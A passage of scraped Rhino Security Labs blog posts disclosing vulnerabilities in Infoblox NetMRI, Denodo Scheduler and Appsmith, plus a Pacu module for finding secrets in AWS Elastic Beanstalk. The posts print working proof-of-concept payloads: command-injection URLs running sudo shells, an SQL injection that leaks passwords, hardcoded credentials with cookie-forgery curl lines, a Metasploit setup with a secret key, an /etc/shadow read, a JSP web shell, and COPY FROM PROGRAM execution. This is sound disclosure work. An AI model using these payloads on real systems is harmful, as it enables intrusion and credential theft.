focus on exploiting this weakness in order to make requests to unintended API endpoints.\nThe way this turns into XSS is when the response of the API request is dangerously placed within the DOM. When an attacker can combine this CSPT with another gadget such as a file upload or an open redirect that allows for control over the response, then the attacker can achieve XSS.\nFor CSRF, this occurs when the CSPT can be leveraged to make a state changing request with the request method of the request that the attacker controlled. While the preferred scenario would be for the controlled request to be a POST or a PUT request, there are still instances of GET based CSRF’s in modern applications that can be uncovered. (Read here for more on Client-Side Path Traversals)\nBusiness Logic Flaws\nThe most common bug type found in these implementations were some form of business logic flaw. The implementation logic within these various programs made various assumptions on how the user would interact with the program and this led to various instances where the intended flow could be circumvented. Some areas where assumptions might occur can include:\n- Validation of the referral code or other validation requests/flows\n- That users will follow the intended flow\n- User will only enter expected input\nRace Condition\nIt is also possible in referral rewards implementations for a user to get multiple rewards for a single code redemption if a race condition exists in the request that applies the code. Utilizing the single-packet attack, an attacker can send multiple identical requests that arrive at the server at the same time, which can result in a user getting multiple rewards for a single referral.\nReferral Hijacking\nReferral hijacking is a new attack vector found during this research that encompasses the ability for an attacker to change the referral link/code that is sent to a prospective user to the attacker link/code, thus hijacking the referral and becoming the receiver of the reward given to the referrer. One attack path to referral hijacking was discovered: cookie fixation.\nAs mentioned in the cookie-injection gadget section, an attacker can fixate a cookie for a victim by setting the path cookie attribute to a specific path. According to RFC 6265, when a browser finds multiple cookies with the same name, the cookie with the more specific path gets prioritized and sent first. This means that in situations where the referral program is using the URL to Cookie implementation, an attacker with the ability to fixate a cookie can fixate the referral cookie containing the attacker referral code and set the path to the request that applies the referral code, which will lead to the attacker hijacking the referral and receiving the reward instead of the original referring user.\nSecure Development Recommendations\nIn order to prevent the above vulnerabilities, companies have several steps they can take to securely develop referral program functionality.\n- For business logic flaws, avoid making implicit assumptions about user behavior or the behavior of other parts of the application.\n- For cookie-injection, validating/sanitizing user input before applying it to a cookie value.\n- For client-side path traversals, sanitize/validate input before concatenating it with a client-side generated request.\n- For race conditions, the remediation can vary, but the strategies mentioned in this resource are a great start.\n- For referral hijacking via cookie fixation, the remediation for cookie-injection applies as well as preventing other methods of setting a cookie such as Cross-Site Scripting (XSS).\nConclusion\nIn this first part of our series, we’ve explored the fundamental architecture behind referral rewards programs, identifying three common implementation patterns and the security vulnerabilities that frequently accompany them. From business logic flaws to cookie injection, client-side path traversals, race conditions, and the newly identified referral hijacking attack vector, these programs present a rich attack surface that is often overlooked during security reviews.\nCompanies implementing referral programs should carefully consider the security implications of their chosen approach, following the recommendations outlined above to mitigate potential vulnerabilities. A proper implementation can provide the business benefits of a successful referral program without exposing the company to unnecessary risk.\nIn Part 2 of this series, we’ll move from theory to practice by examining real-world examples of vulnerable referral programs. We’ll provide detailed case studies of exploits discovered during our research, demonstrating how these vulnerabilities manifest in production environments and the impact they can have.", "timestamp": "2025-10-21T13:34:47.801156"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "Multiple CVEs in Infoblox NetMRI: RCE, Auth Bypass, SQLi, and File Read Vulnerabilities", "url": "https://rhinosecuritylabs.com/research/infoblox-multiple-cves/", "published": "Wed, 04 Jun 2025 10:55:00 +0000", "content": "Introduction\nVulnerability Summary\nWhile performing research on Infoblox’s NetMRI network automation and configuration management solution, we discovered 6 vulnerabilities in version 7.5.4.104695 of the NetMRI virtual appliance. These ranged from unauthenticated command injection (CVE-2025-32813), SQL injection (CVE-2025-32814), hardcoded credentials (CVE-2025-32815), cookie forgery, and arbitrary file read as root (CVE-2024-54188).\nThis post provides a detailed walkthrough of each vulnerability, including discovery techniques and how attackers could exploit the vulnerabilities.\nVendor: Infoblox\nProduct: NetMRI\nAffected Platforms: Virtual Appliance (VM)\nConfirmed Vulnerable Versions: 7.5.4.104695\nFixed Version: 7.6.1\nProduct URL: Infoblox NetMRI\nCVE-2025-32813: Unauthenticated Command Injection in get_saml_request\nAn endpoint designed to retrieve SAML requests is vulnerable to unauthenticated command injection. The endpoint fails to sanitize the saml_id\nparameter which is concatenated into a system command, allowing OS commands to be executed.\nThis vulnerability exists in /infoblox/webapp/netmri/app/rails/app/controllers/application_controller.rb\nas seen below.\nIO.popen executes the command string in a shell. By interpolating #{saml_id} directly into the command. The user input (request.parameters[‘saml_id’]) can control part of the shell command. Although there is a check on saml_id , this does not prevent the command from being injected as long as the saml_id starts with an integer.\nProof of Concept\nVisit the following URL in your browser or via curl:\nhttps://<NETMRI_HOST>/webui/application/get_saml_request?saml_id=1%26http://$(whoami)\nThis results in the execution of the whoami command on the server. By prepending http:// to the command injection the output of the command will be displayed in the resulting response.\nThis image shows the output of the command injection.\nOr better yet, run commands as root using sudo.\nhttps://<NETMRI_HOST>/webui/application/get_saml_request?saml_id=1%26http://$(sudo /bin/sh -c whoami)\nThis image shows command execution as root.\nThis is possible due to a netmri ALL = NOPASSWD: /bin/sh entry in /etc/sudoers .\nRemote Code Execution via Hardcoded Ruby Cookie Secret Key\nThis allows Remote Code Execution via a hardcoded ruby cookie secret. This vulnerability was not assigned a CVE ID by Infoblox as it was stated the underlying vulnerability is a known flaw with it’s own CVE referencing CVE-2013-0156.\nThe NetMRI virtual appliance includes a Ruby on Rails web component. We discovered the Rails session cookie signing key is hardcoded in the VM, located at:\n/skipjack/app/rails/config/session_secret.txt\nThis value is hardcoded and was the same on every boot and VM downloaded.\nRuby on Rails deserializes session cookies if the signing key is valid. With access to this key, it’s possible to craft a malicious session leading to remote code execution (RCE).\nProof of Concept\nAs the Ruby cookie deserialization is a well known vulnerability, there is a Metasploit module to exploit this. Metasploit’s rails_secret_deserialization\nmodule will generate a malicious cookie for the _netmri\ncookie using the hardcoded signing key and allow Remote Code Execution.\nMetasploit Setup:\nuse exploit/multi/http/rails_secret_deserialization set COOKIE_NAME _netmri set RPORT 443 set SSL true set SECRET b525fc341ce5f4d76505e7664863750f865823ba866c536e0246c195cd6cf19cc63771d6becd71c99f5beef080ac27bc3b4f72430840d83cb4efd62acb7c6dcf set TARGETURI /webui/gui_states/index.json run\nThis will result in a shell on the host as the netmri user which can be escalated to root using sudo /bin/sh.\nThis image shows obtaining a root shell using the Metasploit module.\nCVE-2025-32814: Unauthenticated SQL Injection via skipjackUsername\nNetMRI’s login page is vulnerable to unauthenticated SQL injection through the skipjackUsername GET parameter. This parameter is the username supplied when logging into the application. By injecting crafted SQL, we can extract database information. This was easily identified by the verbose error message when inserting a double quote into the skipjackUsername parameter.\nThis image shows the verbose error indicating SQL Injection.\nProof of Concept\nThe following crafted URL to retrieve the cleartext admin password using error based SQL Injection:\ncurl -k https://<NETMRI_HOST>/netmri/config/userAdmin/login.tdf?skipjackUsername=admin\"+AND+updatexml(rand(),concat(CHAR(126),NetmriDecrypt((select%20PasswordSecure%20from%20skipjack.ACLUser%20where%20UserName=\"admin\"),\"password\",1),CHAR(126)),null)--\"&skipjackPassword=anything&weakPassword=true&eulaAccepted=Accept&mode=DO-LOGIN\nThis payload will leak the cleartext admin password using the database user defined function NetmriDecrypt().\nCVE-2025-32815: Authentication Bypass via Hardcoded Credentials\nInside the NetMRI VM, the file syslog.cfg\nand its template version contain hardcoded Process Manager (PM) credentials. These can be used to authenticate against internal endpoints.\nThe following files were found to contain the credentials:\n/tools/skipjack/app/WEB-INF/conf/syslog.cfg /tools/skipjack/app/WEB-INF/conf/syslog.cfg.tmpl\nThis image shows the hardcoded system credentials.\nAfter examining the code we identified the following endpoints were accessible with these credentials:\n/netmri/common/SetRawCookie.tdf\n/netmri/common/SetCookie.tdf\nWe were able to leverage this vulnerability to escalate to admin via cookie forgery in the application.\nPrivilege Escalation via Cookie Forgery\nLeveraging the endpoints above and the PM credentials, we can create a forged session that impersonates an admin user through carriage return, newline injection in a cookie store file.\nLooking at the validate_user\nlogic in the code below we can see that the application opens the session file based on the cookie name starting with Skipjack-\nand uses its value to open the session file. It searches the session file for a line beginning with UsersName\n, and takes the value after =\nand sets that as the user for the session.\nBeing able to create a new session file with the line UserName=admin\nshould grant access as the admin user.\nIt was found that the SetRawCookie.tdf\nand SetCookie.tdf\nendpoints were vulnerable to newline injection which would allow us to achieve a forged cookie file with UserName=admin\n.\nProof of Concept\nUse curl and the _pm user credentials to interact with the SetCookie APIs:\ncurl -u '_pm:pm19726' -c - -k \"https://<NETMRI_HOST>/netmri/common/SetRawCookie.tdf?name=letmein&value=%78%79%7a%0d%0a%55%73%65%72%4e%61%6d%65%3d%61%64%6d%69%6e\" curl -u '_pm:pm19726' -c - -k \"https://<NETMRI_HOST>/netmri/common/SetCookie.tdf?name=letmein&value=%78%79%7a%0d%0a%55%73%65%72%4e%61%6d%65%3d%61%64%6d%69%6e\"\nThe payload, when URL-decoded, injects a newline to create a cookie file as follows:\nletmein UserName=admin\nThe resulting forged cookie grants full administrative access to the NetMRI application.\nThis image shows obtaining a forged admin cookie.\nWe can then use the forged session to perform authenticated exploits, like reading files.\nThis image shows the forged cookie being used to reach an authenticated endpoint.\nCVE-2024-54188: Authenticated Arbitrary File Read as Root\nThis allows authenticated users to read any file as root, exposing sensitive data. A Java servlet intended to retrieve files for creating graph reports can be abused to read arbitrary files.\nThis image shows the web.xml file with the servlet mapping to the Java class responsible for handling the requests.\nDecompiling the ViewerFileServlet class reveals a straightforward file read vulnerability where the filename parameter is retrieved from the request and then passed to FileInputStream and the file data is then returned.\nThis image shows the vulnerable code in the ViewerFileServlet.\nProof of Concept\nAfter authentication or using an authenticated cookie in a curl request, request the following URL:\nhttps://<NETMRI_HOST>/visual/ViewerFileServlet?fileName=/etc/shadow\nThis returns the full contents of /etc/shadow.\nThis image shows the content of /etc/shadow being read using the vulnerability.\nCVE-2024-52874: Authenticated SQL Injection in Run.tdf\nA final vulnerability allows authenticated users can trigger SQL injection in the Run.tdf endpoint through the Scripts parameter.\nProof of Concept\nEnsure you are logged in as an admin and then open the following URL:\nhttps://<NETMRI_HOST>/netmri/ccs/tx/run/Run.tdf?Scripts=1+AND+updatexml(rand(),concat(CHAR(126),NetmriDecrypt((select%20PasswordSecure%20from%20skipjack.ACLUser%20where%20UserName=\"admin\"),\"password\",1),CHAR(126)),null)--\nThis payload will leak the cleartext admin password using the database user defined function NetmriDecrypt().\nConclusion\nThis group of vulnerabilities — including unauthenticated command injection, RCE via Ruby cookie forgery, and privilege escalation — represents critical unauthenticated and privileged risks for organizations running NetMRI 7.5.4.104695. We recommend updating affected systems with the patches and updates released by Infoblox, see the KB articles below.\nProof of concept code can be found in our CVE GitHub repository: https://github.com/RhinoSecurityLabs/CVEs\nVendor KB Articles\nVulnerability Disclosure Timeline\nAs always, feel free to follow us on Twitter or LinkedIn and join our Discord for more releases and blog posts.\nTwitter: https://twitter.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/\nDiscord: https://discord.gg/TUuH26G5\nResearcher/Author: https://twitter.com/daveysec", "timestamp": "2025-10-21T13:34:48.710356"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CVE-2025-26147: Authenticated RCE In Denodo Scheduler", "url": "https://rhinosecuritylabs.com/research/cve-2025-26147-authenticated-rce-in-denodo/", "published": "Wed, 21 May 2025 17:16:07 +0000", "content": "Introduction\nAffected Product Summary\nDenodo provides a range of logical data management software.\nThis blog focuses on one such software, called “Scheduler”. Denodo Scheduler allows the scheduling and execution of data extraction and integration jobs.\nVendor: Denodo\nProduct: Denodo Scheduler\nConfirmed Vulnerable Version: v8.0.202309140\nFixed Version: Denodo 8.0: denodo-v80-update-20240307\nDenodo Scheduler: A time-based Job Scheduler\nThe Denodo Scheduler is a web application written in Java. The web application contains administrative functionality that allows administrators to configure servers, databases, and specify forms of authentication.\nIn Scheduler’s authentication settings, administrators can configure authentication through Kerberos. Kerberos is a network authentication protocol that uses tickets and symmetric-key cryptography to allow secure authentication over an insecure network. The web application allowed administrators to upload “Keytab” files. A keytab (key table) file in Kerberos is a file that stores service principal credentials (encrypted keys) for authentication without requiring a password.\nWhen intercepted with a HTTP proxy, the HTTP request that uploads the “Keytab” file is a multipart form data POST request. In the “Content-Depsoition” HTTP header, the web application sends the name of the form and the filename, “keyTabFile” and “filename” respectively. It is in the value of the “filename” attribute where a path traversal attack vulnerability was found. A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder.\nBy manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file systems. Specifically for CVE-2025-26147, the payload in the Kerberos “Keytab” file upload request allows a malicious user to upload a file to (almost) anywhere in the server’s filesystem:\nfilename=”../../../../opt/denodo/malicious.file.txt”\nHowever, when a file was uploaded, a timestamp was appended to the filename. For example, if the previous “filename” was uploaded it would create the following file on the system:\nmalicious.file-1711156561716.txt\nThe filename with the timestamp was given to the user via the HTTP response, eliminating the need to guess the timestamp. But, another path to remote code execution would need to be found.\nFilename with the timestamp.\nEscalation to Remote Code Execution\nWith the ability to write arbitrary files to the filesystem, it’s time to enumerate the filesystem to determine where a malicious file would be the most impactful and hopefully lead to code execution.\nAs previously mentioned, the application and the deployment environment were in Java. Specifically, the web server was Apache Tomcat.\nApache Tomcat (called “Tomcat” for short) is a free and open-source implementation of a “pure Java” HTTP web server environment in which Java code can also run.\nUsing Linux command-line programs “find” and “grep”, an Apache Tomcat web root directory was discovered on the file system.\n/path/to/webroot/resources/apache-tomcat/webapps/ROOT/\nThe next step was to create a Java Web Shell. A Java Web Shell (JSP-based) is a type of malicious or administrative script that allows remote code execution on a web server running JavaServer Pages (JSP).\nBelow is an example of a Java Web Shell that, when executed, will run the command supplied to the GET HTTP request URL query parameter “cmd.”\n<% String cmd = request.getParameter(\"cmd\"); if (cmd != null) { Process p = Runtime.getRuntime().exec(cmd); java.io.InputStream is = p.getInputStream(); java.util.Scanner s = new java.util.Scanner(is).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; response.getWriter().println(output); } %>\nExample of a Java Web Shell.\nAfter uploading the Java Web Shell, a user can execute commands remotely by visiting the web shell. The image below shows the result of executing the “id” command.\nExample executing the “id” command.\nConclusion\nThis blog highlights how a seemingly simple vulnerability can be escalated to achieve remote code execution and outlines the importance of taking a defensive coding approach to all software development in order to ensure the confidentiality, integrity, and availability of services for end users. This vulnerability was found by John De Armas and Morgan Backus.\nWe would like to thank Denodo for their swift response and handling of these issues when we brought them to their attention.\nLastly, stay informed about our latest updates and research by following us on our social media channels.\nTwitter: https://x.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/", "timestamp": "2025-10-21T13:34:49.567135"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "New Pacu Module: Secret Enumeration in Elastic Beanstalk", "url": "https://rhinosecuritylabs.com/tools/new-pacu-module-enumerating-elastic-beanstalk/", "published": "Tue, 22 Apr 2025 12:22:00 +0000", "content": "From Pentest to Pacu Module\nDuring a recent AWS penetration test, the client was using a service I do not see very often: AWS Elastic Beanstalk (EBN). This is a service that makes it easy to deploy web applications without managing the underlying infrastructure. The client was using this service to host web apps to support their core services.\nOne of the first things I look for during an AWS penetration test is hardcoded secrets. I often discover credentials in services such as Lambda Functions, EC2 User Data, and Cloud Formation templates. These credentials provide a deeper foothold into the target environment, allowing me to elevate privileges or move laterally. Pacu simplifies this process–with just a few commands I can enumerate secrets from all these services.\nAfter launching Pacu, I searched for modules related to “beanstalk” and found nothing to help with the engagement. I then spent the next few hours reading through AWS documentation to understand the API calls required for Elastic Beanstalk. Refusing to do this manually the next time, I started developing an Elastic Beanstalk Pacu module to save me (and you) hours on the next AWS penetration test.\nThis is the walkthrough of what I learned about Elastic Beanstalk and our new Pacu module to enumerate these cloud resources.\nElastic Beanstalk Service Details\nAWS Elastic Beanstalk simplifies deploying and scaling applications by abstracting the underlying AWS infrastructure. When you create an Elastic Beanstalk environment, AWS provisions resources like EC2 instances, Load Balancers, and Auto Scaling groups on your behalf. Configuration of Beanstalk is done through a wizard in the AWS Console or via Infrastructure as Code (Terraform / CloudFormation).\nElastic Beanstalk organizes resources into ‘applications’ and ‘environments.’ You can think of the application as a folder for the project and the environment as a running copy of the app, configured a certain way (i.e., development, testing, production). This is admittedly confusing but important to understand.\nThis image shows the relationship between applications and environments. MyStore-dev and MyStore-prod are two separate environments within one application.\nEnvironment properties allow developers to pass configuration details like database credentials or API keys directly into applications at runtime. Beanstalk also supports tagging so organizations can categorize environments. Depending on the organization’s use of tags, these may provide clues as to what to target or avoid (ie: a tag of “honeypot”).\nThe ability to set environment properties is convenient, but can lead to secret exposure if not configured properly.\nElastic Beanstalk Secret Exposure\nOne common misconfiguration is exposing sensitive information through environment properties and application source code. Elastic Beanstalk allows setting environment properties for each application environment – for example, database connection strings, API keys, or credentials. Similarly, the application’s source code (which Elastic Beanstalk bundles and stores in an S3 Bucket) may contain hardcoded secrets like API tokens or even AWS access keys. This misconfiguration is not limited to Beanstalk–the proper practice is to always store secrets in Secrets Manager rather than in environment properties or source code.\nA leaked AWS access key or database password from an Elastic Beanstalk configuration can lead to privilege escalation, data compromise, or lateral movement within an AWS account. Even though Elastic Beanstalk abstracts away infrastructure management, the need to secure sensitive data and configurations is always the responsibility of the cloud customer.\nManual Enumeration of Elastic Beanstalk\nDuring the penetration test, I began by using the AWS CLI commands DescribeApplications and DescribeEnvironments to list all Elastic Beanstalk applications in the account along with their associated environments. I then created a full inventory of deployments to identify sensitive Beanstalk deployments.\nFor each environment, I invoked DescribeConfigurationSettings which returned detailed configuration data (settings and environment properties). The environment properties contained numerous secrets–everything from AWS credentials to API Keys. These credentials allowed me to authenticate as other IAM principles and move laterally within the AWS account.\nFinally, I ran DescribeApplicationVersions to identify the S3 bucket names and object keys where the source code was stored. I used the S3 API to download each source bundle locally, unzip it, and perform static review of the underlying code. I discovered more hardcoded credentials in the code which led to privilege escalation.\nWhat took me hours of reading AWS documentation and manually looking for secrets can now be done in minutes with our new Pacu module.\nIntroducing ‘elasticbeanstalk__enum’ Pacu Module\nTo uncover these risks, we have developed a new Pacu module called ‘elasticbeanstalk__enum.’ This module automates the manual process a penetration tester would otherwise perform. At a high level, ‘elasticbeanstalk__enum’ does the following:\n- Enumerates Elastic Beanstalk Applications and Environments\n- Gathers Configuration Settings and Tags\n- Downloads Application Source Code\n- Scans for Secrets\nModule Details\n- Enumerates Elastic Beanstalk Applications and Environments: It lists all Elastic Beanstalk applications in the target AWS account and their associated environments. This gives an immediate inventory of what apps exist and how many environments each has. Applications can contain multiple environments, such as development, staging, and production.\n- Gathers Configuration Options and Tags: For each environment, the module retrieves configuration options, including environment properties and configuration details. Any tags applied to Elastic Beanstalk resources are also collected. Tags can sometimes hint at environmental purpose or owner, which can be useful in an assessment.\n- Downloads Application Source Code (Optional): The module attempts to download the source bundle for each application version deployed in Beanstalk. These bundles are stored as .zip files in an S3 Bucket. The module will locate the S3 bucket and download the app source code for static analysis. Downloading source code is optional and will only run if the –source flag is specified.\n- Scanning for Secrets: Finally, the module uses Pacu’s Secrets Finder library to scan the retrieved environment variables and source code for secret patterns such as AWS Secret Keys, database connection strings, API keys, private SSH/X.509 keys, Beanstalk Config passwords, and other sensitive strings.\nGetting Started with ‘elasticbeanstalk__enum’\nAfter importing AWS keys into Pacu, you can retrieve more information on this module:\nhelp elasticbeanstalk__enum\nThe module provides the following options. If an option is not specified, it will attempt to run all of the options (except for downloading source code) in the targeted account.\n- Region: Comma-separated AWS regions, e.g., “us-east-1”. Defaults to all session regions.\n- Applications: Enumerate all Beanstalk applications.\n- Environments: Enumerate all Beanstalk environments for each application.\n- Config: Enumerate all configuration settings (including environment variables).\n- Tags: Enumerate resource tags for all environments.\n- Source (Optional): Download the deployed app source code for further review.\nRunning the module with these options is simple:\nrun elasticbeanstalk__enum –region us-east-1\nThis will enumerate all applications, environments, configurations, and tags. Any secrets discovered by Pacu will be green on the terminal and downloaded for verification.\nThis image shows the output of running the module with default options.\nThe module will output “MODULE SUMMARY” at the end to provide an overview of the Elastic Beanstalk instances:\nThe MODULE SUMMARY\nOutput from the module can be retrieved from within the Pacu session. This provides an easy way to check the Beanstalk configurations from within Pacu (i.e. Environment Names, Application Names, URLs) with the following command:\ndata elasticbeanstalk\nThis image shows the output of the “data elasticbeanstalk” command in Pacu.\nHands-On: New Beanstalk CloudGoat Scenario\nTo help you get practice with this new module and learn common AWS misconfigurations we have created a new CloudGoat scenario named beanstalk_secrets.\nIn the scenario, you are provided with low-privileged AWS credentials, tasked with enumerating and exploiting the Elastic Beanstalk environment, and elevating your privileges to capture the final flag.\nConclusion\nElastic Beanstalk simplifies application deployment, but also expands the attack surface if secrets are not stored properly. This module will save you the time of reading through AWS documentation and trying to figure out just the right flag to search for secrets. Using Pacu to automate the process ensures all secrets are discovered, verified, and reported to the client.\nTwitter: https://twitter.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/\nDiscord: https://discord.gg/vTWRkdPxk2", "timestamp": "2025-10-21T13:34:50.457104"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CVE-2024-55963: Unauthenticated RCE in Default-Install of Appsmith", "url": "https://rhinosecuritylabs.com/research/cve-2024-55963-unauthenticated-rce-in-appsmith/", "published": "Tue, 25 Mar 2025 13:00:00 +0000", "content": "Introduction\nAffected Product Summary\nWhile reviewing the Appsmith Enterprise platform, Rhino Security Labs uncovered a series of critical vulnerabilities affecting default installations of the product. Most severe among them is CVE-2024-55963, which allows unauthenticated remote code execution due to a misconfigured PostgreSQL database included by default. Two additional vulnerabilities (CVE-2024-55964 and CVE-2024-55965) enable unauthorized access to sensitive data and application denial of service.\nThis post details each issue, including technical breakdowns, proof-of-concept exploits, and detection methods.\nVendor: Appsmith, Inc.\nProduct: Appsmith (Community, Business, and Enterprise Editions)\nConfirmed Affected Version: 1.20 – 1.51\nVendor Advisory: Appsmith Github\nWhat is Appsmith\nAppsmith is an open-source developer tool designed to help organizations build internal applications, such as dashboards, admin panels, and customer support tools. Users can develop User Interface (UI) elements and connect various data sources to the User Interface such as databases and Large Language Models (LLMs).\nThe product ships out with three pricing plans: Free, Business and Enterprise. The vulnerable functionality referenced in this blog is available to all three pricing plans.\nAppsmith Technical Background\nUser Roles\nIn Appsmith, there are three user roles:\n- Administrator: Can modify all workspace settings including editing applications, inviting other users to the workspace and exporting applications from the workspace.\n- Developer: Can edit and view applications along with inviting other users to the workspace.\n- App Viewer: Can view applications and invite other users to view applications.\nWorkspaces\nIn Appsmith, all applications are developed within Workspaces. Users can create multiple Workspaces to organize projects and invite others to collaborate, allowing for shared development and access to resources within that workspace.\nDatasources\nAppsmith enables users to connect their applications to a wide range of data sources. These “Datasources” include traditional databases like PostgreSQL, MySQL, and MongoDB, cutting-edge Large Language Models (LLMs) such as OpenAI and Anthropic, external API Endpoints for integrating with other services, and various other data sources. These connections allow applications to dynamically retrieve and display data.\nApplications vs Web App\nTo avoid confusion, it’s important to distinguish between two terms frequently used in this blog: “applications” and “web app.” Appsmith is a platform that enables users to create applications within workspaces. These applications encompass UI design, custom JavaScript, data source integrations, and more. Throughout this blog, the term “application” or “applications” will specifically refer to these user-created projects. “Web application” or “web app” will refer to the Appsmith platform itself as a whole.\nCVE-2024-55963 - Unauthenticated Remote Code Execution as postgres user\nMisconfigured Integrated Database\nAppsmith provides the ability to connect a variety of datasources to create applications. Included are practice datasources to help new users learn. One of these practice datasources is a PostgreSQL database running locally on the Appsmith server.\nThe PostgreSQL authentication configuration file, pg_hba.conf, has the following entry:\nThis configuration allows any local user to connect as any PostgreSQL user.\nThis configuration allows any local user to connect as any PostgreSQL user (including superuser) without providing a password because the trust authentication method explicitly bypasses authentication.\nThis image shows the connection request using any arbitrary value for the Postgres User.\nThis image shows the successful response connecting to the postgresql database with an arbitrary value for the password.\nWhen connecting the datasource to an application, the connection is made by the Appsmith server, not the user’s browser. This server-side connection allows access to the locally hosted PostgreSQL database.\nDefault Allow for Account Signup\nOur next goal was to find a way as an unauthenticated user to gain access to the datasource’s functionality and connect to the locally run PostgreSQL database. The application specifies that only the Administrator and Developer roles can configure and interact with datasources, and only invited users given those roles can carry out that functionality.\nWhile the app requires an invitation to access current Workspaces, its default configuration allows for user signup. Following signup, a user can then configure their own workspaces and applications, and connect datasources of their own to those applications.\nExploiting CVE-2024-55963\nBy combining the misconfigured database (included as part of the AppSmith installer) with default configuration that allows user signup, it is possible for an attacker to signup on the application, create an application, and connect to the misconfigured database. From there, it is possible to execute SQL queries that allow for system command execution.\nA simple Proof of Concept is as follows:\nCREATE TABLE PoC (column1 TEXT); COPY PoC FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM PoC; DROP PoC; -- (This is to clean up the database after our exploit.)\nProof of Concept\nProof of concept\nA detailed proof-of-concept exploit is available, demonstrating how an unauthenticated attacker can register a new account, create an application, connect to the misconfigured local PostgreSQL database, and execute arbitrary system commands via crafted SQL queries. The script includes usage instructions for testing and validation.\nTo support detection efforts, Rhino has also developed a custom Nuclei template targeting key indicators of the vulnerabilities. This allows security teams to quickly scan Appsmith instances for vulnerable versions. The exploit and nuclei template can be viewed in our CVE Github repository.\nCVE-2024-55964: IDOR allowing “App Viewer” user Database SQL access\nExploring API Calls\nWhile the App Viewer role user, which has very limited view-only permissions, cannot access the part of the application used to configure database connections and queries, we began to test the API endpoints related to datasources. We wanted to see if the authorization checks were set for all requests related to querying and retrieving data from databases. We discovered the following API request, which is made when a saved query for the datasource is loaded on the datasource’s home page:\n/api/v1/datasources/[datasource-id]/schema-preview.\nExamining ID Generation\nThe datasource ID consists of a 24-character hexadecimal value, a base-16 number system. Initially, these IDs appeared to be random, but further investigation revealed a predictable pattern.\n- Characters 1-5 remain constant with each generated ID.\n- Characters 6-8 are randomly generated.\n- Characters 9-22 remain constant with each generated ID.\n- Characters 23-24 are randomly generated.\n- The static characters vary between self-hosted instances.\nThis image shows a diagram explaining the static and unique values of a generated ID.\nThis leaves an attacker with only 5 characters to brute force. Attackers can identify datasources following the steps below:\n- Create a workspace and create an application within that workspace.\n- Within the newly created application, configure a datasource.\n- View the ID and identify the static 19 character values.\n- Brute force the remaining 5 characters to identify valid datasource IDs. These can be identified by the varying content lengths and response time.\nThis image shows an example brute force attempt of valid datasource IDs.\nExploiting CVE-2024-55964\nAn attacker can then take the identified datasource IDs and use the API endpoint mentioned earlier to probe for any datasources involving a SQL database. The API request only is used with SQL databases. Once a compatible datasource is identified, an attacker can begin to make arbitrary SQL queries against the database using the API request. Example below:\nExamples of arbitrary SQL queries being made against the database\nVulnerability Constraints\nThe impact of this IDOR vulnerability is mitigated by Appsmith’s workspace-level authorization. Datasource connectivity is strictly scoped to the workspace in which the datasource is defined. Therefore, an attacker’s ability to issue arbitrary SQL queries is limited to datasources residing within workspaces they have been authorized to access.\nCVE-2024-55965: Denial of Service via Broken Access Control allowing “App Viewer” access to ‘Restart’ API request\nAdmin Settings\nWhen an administrator modifies site-wide settings, such as authentication methods, appearance themes, or other general configurations, the Appsmith web application requires a restart. This restart is triggered by a POST request to a dedicated restart API endpoint, which briefly takes the application offline for approximately 30 seconds. As documented in Appsmith’s permissions documentation, only administrators are authorized to trigger this restart. Separately, we discovered that users’ session cookies remain active even after the application restarts, allowing them to continue using the application without re-authentication. This cookie persistence, while not a vulnerability on its own, was a critical gadget in the exploit chain.\nThis image shows the restart request.\nTracing the Restart Function\nWe logged in as an App Viewer user, a role with very limited view-only permissions, and began to test our access to the site-wide configuration settings. Nearly every request returned a standard ‘403 Access Denied’ error, indicating that access was properly restricted. However, the restart request, which triggers an application server restart, returned a distinct error message. This deviation from the expected ‘403’ response indicated a separate code path for this specific request, suggesting a critical flaw in the permission checks. This vulnerability was confirmed when the application unexpectedly restarted despite the user’s lack of administrative privileges.\nThis image shows the custom 403 error message when making the restart request as a non-admin user.\nTo understand why the application restarted despite the permission error, we examined the code responsible for the restart function. The relevant section of code was found within the Appsmith server’s code, specifically in the following location: app/server/appsmith-server/src/main/java/com/appsmith/server/solutions/ce/EnvManagerCEImpl.java.\nThe following code snippet shows the area responsible for checking user permissions before allowing a restart.\n@Override public Mono<User> verifyCurrentUserIsSuper() { return userUtils.isCurrentUserSuperUser().flatMap(isSuperUser -> { if (isSuperUser) { return sessionUserService.getCurrentUser(); } else { return Mono.error(new AppsmithException(AppsmithError.UNAUTHORIZED_ACCESS)); } }); } @Override public Mono<Void> restart() { return verifyCurrentUserIsSuper().then(restartWithoutAclCheck()); }\nThe code was designed to prevent users without administrator privileges from restarting the application server. However, due to a coding error, the application’s Global Exception Handler, which is responsible for managing errors, ignored the permission check.\nInstead of preventing the restart for unauthorized users, it allowed the action to proceed. This effectively bypassed the intended permission check, allowing the restartWithoutAclCheck() function, which performs the restart without checking user permissions, to execute regardless of the user’s permissions.\npublic class GlobalExceptionHandlerTest { /* * test case to ensure that whenever there is appsmithPluginException on server, * we never expose the plugin status code directly, * instead we use generic 500 internal server error. * The actual plugin status code is visible inside response.status * https://github.com/appsmithorg/appsmith/pull/29009 for more context */ @Test public void testCatchPluginException_onAppsmithPluginException_throwsInternalServerError() { MockServerHttpRequest httpRequest = MockServerHttpRequest.get(\"\").build(); MockServerWebExchange exchange = MockServerWebExchange.from(httpRequest); GlobalExceptionHandler handler = new GlobalExceptionHandler(null, null, null, null); Mono<ResponseDTO<ErrorDTO>> exceptionHandlerMono = handler.catchPluginException( new AppsmithPluginException(AppsmithPluginError.PLUGIN_AUTHENTICATION_ERROR), exchange); StepVerifier.create(exceptionHandlerMono) .assertNext(response1 -> { // This asserts internal status code of the response assertEquals(response1.getResponseMeta().getStatus(), 401); // This asserts main/external http status code of the response assertEquals(exchange.getResponse().getStatusCode().is5xxServerError(), true); }) .verifyComplete(); } }\nExploitation of CVE-2024-55965\nBy exploiting the flawed exception handler, combined with the persistent session cookies, an attacker could automate repeated restart requests, 